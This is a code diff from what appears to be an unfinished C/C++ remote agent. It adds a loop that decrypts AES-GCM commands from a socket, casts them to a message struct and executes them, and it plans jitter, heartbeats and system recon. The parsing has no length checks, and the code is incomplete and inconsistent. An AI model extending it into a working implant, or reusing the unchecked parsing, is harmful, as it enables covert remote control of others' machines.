@@ -40,25 +40,102 @@ int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the co
 	return 0;
 }
 
-int serialize(InternalMessage* msg, uint8_t* buf, SerializationType serializationType) 
+
+//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
+//bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received, Config& config)
+bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 {
+	// TODO: replace 'true' with a condition
+	while (true) // TODO: change to var... while tcp connection is valid/established/successful
+	{
+		// TODO: socket stuff
+
+		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
+		// if there's incoming commands...
+
+		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
+		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
+		// and is a valid MessageType and what not
+		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
+		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
+
+        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
+		handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
+
+		//publisher
+        send(&resultMsg, config); // TODO: check return value for errors
+
+
+
+        // if heartbeat interval elapsed... 
+        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?
+
+		// sleepWithJitter()
+
+		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
+	}
+
+	return false; // if no errors, return 0
+}
+int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
+{
+	// Raw Bytes from Socket
+	uint8_t buf[4096]; // TODO: rename to plaintext?
+
+	// DECRYPT -> Decrypted Bytes
+	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
+	const uint8_t* iv = rawData;
+	const uint8_t* ciphertext = rawData + 12;
+	size_t ciphertext_len = rawDataLength - 12 - 16;
+	const uint8_t* tag = rawData + 12 + ciphertext_len;
+	int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size
+
+	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
+	// parseHeader()
+	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error
+
+	// DESERIALIZE -> InternalMessage 
+	// check length(plaintext) == sizeof(InternalMessage)
+    // const InternalMessage* msg = (const InternalMessage*)plaintext;
+	// VALIDATE
+    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
+    // check length(plaintext) == expected_size
+
+	InternalMessage* msg = (InternalMessage*)buf;
+
+	// EXECUTE (InternalMessage)
+	// call function based on InternalMessage
+	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
+	processMessage(msg, config);
+
+	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
+	//InternalMessage* response = malloc(sizeof(InternalMessage));
+	//memcpy(response->payload, &recon, sizeof(ReconData));
+	//response->header.payload_size = sizeof(ReconData);
+
+	// TODO: cleanup/free buf
+}
+int handleHTTPS(uint8_t* data)
+{
+	// HTTPS Text Message
+
+	// PARSE HTTP HEADERS
+
+	// EXTRACT JSON BODY
+
+	// EXTRACT BASE64 FIELD
+
+	// BASE64 DECODE -> Raw Bytes
+
+	// DECRYPT -> Decrypted Bytes
+
+	// DESERIALIZE -> InternalMessage
+
+	// VALIDATE
+
+	// EXECUTE (InternalMessage)
 
 }
-
-int serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
-	BYTE* ptr = buffer; // uint8_t*
-
-	// Copy each field from msg struct to buffer
-	memcpy(ptr, &msg->dwMajorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
-	memcpy(ptr, &msg->dwMinorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
-	memcpy(ptr, &msg->dwBuildNumber, sizeof(ULONG)); ptr += sizeof(ULONG);
-	memcpy(ptr, &msg->wProductType, sizeof(UCHAR)); ptr += sizeof(UCHAR);
-	// ... other fields
-	return ptr - buffer; // Returns total bytes copied
-}
-
-// int deserialize() {}
-
 
 
 int compressData(uint8_t* buf) 
